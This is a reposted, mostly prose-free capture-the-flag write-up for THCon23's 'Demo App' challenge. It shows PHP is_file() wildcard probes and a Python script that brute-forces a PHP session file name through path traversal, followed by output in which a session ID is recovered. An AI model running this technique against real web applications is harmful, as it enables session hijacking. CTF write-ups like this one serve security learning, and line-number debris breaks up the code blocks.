# Demo App – THCon23 CTF Writeup

> 原文: https://www.ctfiot.com/111899.html
> ID: 111899


```
1
2
3
4
5
6
7
8
is_file('a<<') => false
is_file('b<<') => false
...
is_file('i<<') => true
is_file('in<<') => true
is_file('inde<<') => true
...
is_file('index.php') => true
1
is_file('../www/index.php') => true
1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
from requests import post
from string import ascii_lowercase, digits

def find(prefix):
 for c in ascii_lowercase + digits:
 search = prefix + c
 resp = post("https://demo-app.ctf.thcon.party",
 data={
 "file":"../tmp/sess_" + search + "<<",
 "Check": "Submit Query"
 })

 if "You tried to access file outside" in resp.text:
 print("found:", search)
 find(search)

find(prefix="")
1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
$ python3 solve.py
found: qr
found: qrs
found: qrsg
found: qrsgn
found: qrsgnc
found: qrsgncf
found: qrsgncfd
found: qrsgncfds
[..]
found: qrsgncfdsohnb33115tfkib
found: qrsgncfdsohnb33115tfkib7
found: qrsgncfdsohnb33115tfkib7s
found: qrsgncfdsohnb33115tfkib7s1
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/04/img_6446359d03f61.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/04/img_644635d190f35.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/04/img_6446365090e6f.png)